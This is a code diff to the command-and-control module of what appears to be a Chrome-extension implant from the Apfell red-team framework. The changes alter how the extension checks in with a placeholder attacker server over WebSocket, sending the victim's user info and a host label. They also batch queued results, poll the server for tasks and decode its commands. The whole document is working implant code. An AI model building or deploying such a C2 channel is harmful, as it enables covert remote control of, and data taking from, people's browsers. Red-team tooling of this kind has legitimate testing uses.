@@ -1,6 +1,6 @@
 //------------- Chrome Extension Websocket C2 mechanisms ---------------------------------
 // Dictionary that holds outbound messages
-let out = [];
+var out = [];
 let screencaptures = [];
 let loads = [];
 class customC2 extends baseC2{
@@ -31,13 +31,17 @@ class customC2 extends baseC2{
             "os":"chrome",
             "user":apfell.userinfo,
             "uuid":apfell.uuid,
+            "host":apfell.userinfo + "'s chrome",
             "pid":0,
             "ip":'127.0.0.1',
         };
 
+        let checkin = JSON.stringify(msg);
+        let checkinpayload = apfell.uuid + checkin;
+
         const meta = {
             "client": true,
-            "data": btoa(unescape(encodeURIComponent(JSON.stringify(msg)))),
+            "data": btoa(unescape(encodeURIComponent(checkinpayload))),
             "tag":"",
         };
 
@@ -49,15 +53,16 @@ class customC2 extends baseC2{
     postResponse(){
         if (out.length > 0){
             // Pop and send a message to the controller
-            const msg = out.shift();
-            const meta = {
-                "client":true,
-                "data": msg,
-                "tag":""
-            };
-
-            let final = JSON.stringify(meta);
-            connection.send(final);
+            while (out.length > 0) {
+                const msg = out.shift();
+                const meta = {
+                    "client":true,
+                    "data": msg,
+                    "tag":""
+                };
+                let final = JSON.stringify(meta);
+                connection.send(final);
+            }
         }
     }
 }
@@ -67,12 +72,17 @@ const C2 = new customC2('HOST_REPLACE',  PORT_REPLACE, 'ENDPOINT_REPLACE', SSL_R
 const connection  = new WebSocket(`${C2.server}`);
 
 setInterval(function(){
-    let request = {'action':'get_tasking', 'tasking_size': 1, 'delegates':[]};
-    let msg = JSON.stringify(request);
-    out.push(msg);
-
     C2.postResponse();
-}, C2.interval);
+    if (apfell.apfellid.length !== 0) {
+        let request = {'action':'get_tasking', 'tasking_size': 1, 'delegates':[]};
+        let msg = JSON.stringify(request);
+        let final = apfell.apfellid + msg;
+        let encfinal = btoa(unescape(encodeURIComponent(final)));
+        out.push(encfinal);
+    } else {
+        console.log('Apfell id not set for tasking ' + apfell.apfellid);
+    }
+}, C2.interval * 1000);
 
 chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
     // Listen for task responses that require additional messages
@@ -171,8 +181,10 @@ connection.onerror = function () {
 };
 
 connection.onmessage = function (e) {
-    const rawmsg = atob(e.data);
-    const messagenouuid = rawmsg.slice(35, rawmsg.length - 1);
+    const rawmsg = JSON.parse(e.data);
+    const decoded = atob(rawmsg.data);
+    const messagenouuid = decoded.slice(36, decoded.length);
+
     const message = JSON.parse(messagenouuid);
     switch (message.action) {
         case 'checkin': {
